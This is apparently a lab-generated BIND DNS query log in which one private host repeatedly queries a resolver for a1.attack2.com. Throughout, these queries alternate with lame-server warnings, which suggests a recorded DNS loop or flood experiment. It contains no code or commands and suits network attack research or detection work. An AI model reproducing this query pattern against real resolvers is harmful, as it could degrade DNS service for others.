12-Mar-2025 07:33:12.159 client @0x7f124000b920 172.16.114.11#35868 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:12.223 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:12.223 client @0x7f1380000cd0 172.16.114.11#35214 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:12.267 client @0x7f124000b920 172.16.114.11#35876 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:12.327 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:12.327 client @0x7f12e4000cd0 172.16.114.11#47671 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:12.371 client @0x7f126c007640 172.16.114.11#35892 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:12.435 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:12.439 client @0x7f136c000cd0 172.16.114.11#54098 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:12.483 client @0x7f12b4007640 172.16.114.11#35908 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:12.547 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:12.547 client @0x7f12fc004fb0 172.16.114.11#47989 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:12.595 client @0x7f12b4007640 172.16.114.11#35924 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:12.659 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:12.659 client @0x7f1340000cd0 172.16.114.11#54811 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:12.679 client @0x7f12b4007640 172.16.114.11#35940 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:12.751 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:12.751 client @0x7f12c8000cd0 172.16.114.11#60981 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:12.787 client @0x7f12b4007640 172.16.114.11#35952 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:12.851 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:12.855 client @0x7f12b4000cd0 172.16.114.11#43439 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:12.875 client @0x7f12b4019990 172.16.114.11#35968 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:12.931 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:12.931 client @0x7f12b8000cd0 172.16.114.11#55508 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:12.975 client @0x7f126c007640 172.16.114.11#35978 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:13.043 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:13.043 client @0x7f1270000cd0 172.16.114.11#34915 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:13.091 client @0x7f127000b920 172.16.114.11#35988 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:13.143 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:13.143 client @0x7f12a0000cd0 172.16.114.11#40470 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:13.187 client @0x7f126c007640 172.16.114.11#35990 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:13.251 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:13.251 client @0x7f12c0000cd0 172.16.114.11#49665 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:13.295 client @0x7f126c007640 172.16.114.11#35996 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:13.359 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:13.363 client @0x7f1314000cd0 172.16.114.11#39558 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:13.391 client @0x7f126c007640 172.16.114.11#35998 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:13.459 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:13.459 client @0x7f129c000cd0 172.16.114.11#57381 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:13.503 client @0x7f126c007640 172.16.114.11#36006 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:13.571 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:13.571 client @0x7f1278000cd0 172.16.114.11#38998 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:13.615 client @0x7f126c007640 172.16.114.11#36018 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:13.679 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:13.679 client @0x7f129c000cd0 172.16.114.11#47664 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:13.719 client @0x7f126c007640 172.16.114.11#36026 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:13.783 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:13.787 client @0x7f12b4000cd0 172.16.114.11#59464 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:13.831 client @0x7f12b4019990 172.16.114.11#36040 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:13.887 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:13.887 client @0x7f12a4000cd0 172.16.114.11#43018 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:13.919 client @0x7f126c007640 172.16.114.11#36052 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:13.987 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:13.987 client @0x7f12ac000cd0 172.16.114.11#46674 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:14.019 client @0x7f126c007640 172.16.114.11#36062 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:14.079 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:14.079 client @0x7f1310000cd0 172.16.114.11#45924 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:14.103 client @0x7f1288019990 172.16.114.11#36072 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:14.179 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:14.179 client @0x7f12b0000cd0 172.16.114.11#37439 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:14.219 client @0x7f1288019990 172.16.114.11#36084 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:14.287 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:14.287 client @0x7f1324000cd0 172.16.114.11#43081 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:14.319 client @0x7f12880483d0 172.16.114.11#36100 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:14.383 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:14.383 client @0x7f1348000cd0 172.16.114.11#48451 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:14.427 client @0x7f12b4019990 172.16.114.11#36114 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:14.503 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:14.503 client @0x7f12f4000cd0 172.16.114.11#55241 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:14.551 client @0x7f1268011f60 172.16.114.11#36126 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:14.607 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:14.607 client @0x7f1260000cd0 172.16.114.11#46944 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:14.651 client @0x7f126000b920 172.16.114.11#36140 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:14.707 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:14.707 client @0x7f1344000cd0 172.16.114.11#42106 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:14.751 client @0x7f12a8007640 172.16.114.11#36144 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:14.807 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:14.807 client @0x7f130c000cd0 172.16.114.11#50188 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:14.831 client @0x7f12880483d0 172.16.114.11#36146 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:14.911 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:14.911 client @0x7f12ac000cd0 172.16.114.11#47901 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:14.943 client @0x7f1284007640 172.16.114.11#36156 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:15.011 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:15.011 client @0x7f12d4000cd0 172.16.114.11#55541 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:15.059 client @0x7f1294007640 172.16.114.11#59962 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:15.131 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:15.131 client @0x7f12b4000cd0 172.16.114.11#59296 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:15.175 client @0x7f12b4019990 172.16.114.11#59966 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:15.227 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:15.227 client @0x7f131c000cd0 172.16.114.11#37123 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:15.271 client @0x7f1294007640 172.16.114.11#59974 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:15.335 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:15.335 client @0x7f13280bf6d0 172.16.114.11#50558 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:15.363 client @0x7f1284007640 172.16.114.11#59982 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:15.415 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:15.415 client @0x7f126c000cd0 172.16.114.11#37693 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:15.463 client @0x7f126c019990 172.16.114.11#59984 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:15.511 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:15.511 client @0x7f1278000cd0 172.16.114.11#39231 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:15.555 client @0x7f1284007640 172.16.114.11#59992 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:15.623 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:15.623 client @0x7f12b0000cd0 172.16.114.11#47047 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:15.667 client @0x7f125400ff50 172.16.114.11#60004 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:15.735 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:15.735 client @0x7f1334000cd0 172.16.114.11#49040 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:15.779 client @0x7f1284007640 172.16.114.11#60008 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:15.847 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:15.847 client @0x7f1300000cd0 172.16.114.11#43383 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:15.891 client @0x7f1284007640 172.16.114.11#60010 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:15.963 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:15.963 client @0x7f1334000cd0 172.16.114.11#50827 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:16.007 client @0x7f1294007640 172.16.114.11#60020 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:16.079 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:16.079 client @0x7f1254000cd0 172.16.114.11#57600 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:16.111 client @0x7f1284007640 172.16.114.11#60026 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:16.179 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:16.179 client @0x7f1330000cd0 172.16.114.11#57157 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:16.223 client @0x7f1284007640 172.16.114.11#60030 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:16.287 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:16.287 client @0x7f1304000cd0 172.16.114.11#37513 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:16.331 client @0x7f12880483d0 172.16.114.11#60044 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:16.387 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:16.387 client @0x7f137c000cd0 172.16.114.11#34222 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:16.419 client @0x7f1284007640 172.16.114.11#60046 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:16.487 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:16.487 client @0x7f1254000cd0 172.16.114.11#59326 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:16.519 client @0x7f1284007640 172.16.114.11#60048 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:16.587 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:16.587 client @0x7f1284000cd0 172.16.114.11#48344 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:16.619 client @0x7f1284015970 172.16.114.11#60056 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:16.683 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:16.683 client @0x7f12b4000cd0 172.16.114.11#55326 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:16.731 client @0x7f12b4019990 172.16.114.11#60066 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:16.783 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:16.783 client @0x7f133c000cd0 172.16.114.11#48294 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:16.819 client @0x7f1284015970 172.16.114.11#60080 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:16.887 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:16.887 client @0x7f12a0000cd0 172.16.114.11#36673 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:16.931 client @0x7f1284015970 172.16.114.11#60084 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:17.003 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:17.007 client @0x7f1378000cd0 172.16.114.11#56576 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:17.035 client @0x7f1284015970 172.16.114.11#60098 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:17.095 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:17.095 client @0x7f12c8000cd0 172.16.114.11#39445 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:17.131 client @0x7f1290007640 172.16.114.11#60108 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:17.207 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:17.207 client @0x7f1374000cd0 172.16.114.11#34525 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:17.243 client @0x7f126c019990 172.16.114.11#60124 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:17.307 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:17.307 client @0x7f129c000cd0 172.16.114.11#55725 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:17.355 client @0x7f126c019990 172.16.114.11#60136 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:17.419 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:17.419 client @0x7f1350000cd0 172.16.114.11#40032 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:17.451 client @0x7f126c019990 172.16.114.11#60140 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:17.515 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:17.519 client @0x7f130c000cd0 172.16.114.11#45095 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:17.551 client @0x7f1290007640 172.16.114.11#60148 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:17.627 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:17.627 client @0x7f136c000cd0 172.16.114.11#38029 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:17.659 client @0x7f126c019990 172.16.114.11#60160 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:17.735 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:17.739 client @0x7f13280bf6d0 172.16.114.11#55219 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:17.763 client @0x7f126c019990 172.16.114.11#60162 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:17.815 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:17.815 client @0x7f128c000cd0 172.16.114.11#41877 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:17.859 client @0x7f12b4019990 172.16.114.11#60168 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:17.923 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:17.923 client @0x7f12c0000cd0 172.16.114.11#39508 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:17.971 client @0x7f126c019990 172.16.114.11#60184 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:18.018 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:18.022 client @0x7f1368000cd0 172.16.114.11#40690 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:18.066 client @0x7f1268011f60 172.16.114.11#60186 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:18.126 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:18.126 client @0x7f128c000cd0 172.16.114.11#57437 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:18.174 client @0x7f126c019990 172.16.114.11#60202 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:18.226 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:18.230 client @0x7f1304000cd0 172.16.114.11#58458 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:18.274 client @0x7f12880483d0 172.16.114.11#60210 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:18.314 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:18.314 client @0x7f1260000cd0 172.16.114.11#43511 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:18.362 client @0x7f126c019990 172.16.114.11#60222 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:18.410 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:18.414 client @0x7f12fc004fb0 172.16.114.11#46997 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:18.454 client @0x7f127000b920 172.16.114.11#60238 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:18.494 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:18.498 client @0x7f1264000cd0 172.16.114.11#58798 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:18.542 client @0x7f126c019990 172.16.114.11#60244 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:18.590 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:18.594 client @0x7f12c4000cd0 172.16.114.11#42451 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:18.622 client @0x7f126c019990 172.16.114.11#60260 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:18.674 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:18.674 client @0x7f12dc000cd0 172.16.114.11#43882 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:18.694 client @0x7f126c019990 172.16.114.11#60266 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:18.746 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:18.750 client @0x7f12b4000cd0 172.16.114.11#32826 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:18.794 client @0x7f12b4019990 172.16.114.11#60276 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:18.834 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:18.834 client @0x7f1320000cd0 172.16.114.11#45204 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:18.866 client @0x7f126c019990 172.16.114.11#60282 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:18.918 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:18.922 client @0x7f129c000cd0 172.16.114.11#33205 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
